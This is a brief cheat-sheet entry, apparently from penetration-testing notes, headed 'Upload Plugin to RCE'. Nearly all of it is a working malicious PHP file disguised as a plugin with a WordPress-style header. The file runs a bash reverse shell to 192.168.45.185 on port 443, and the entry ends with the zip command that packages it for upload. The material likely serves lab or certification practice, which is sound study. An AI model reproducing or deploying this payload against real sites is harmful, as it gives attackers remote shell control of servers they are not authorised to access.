### Upload Plugin to RCE
```
<?php
/**
* Author: Saeed Bala
* Plugin Name: PHP Code Plugin
* Description: Shell Through Plugins
* Version: 1.0
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.185/443 0>&1'");
?>

zip -r plug.zip index.php
```
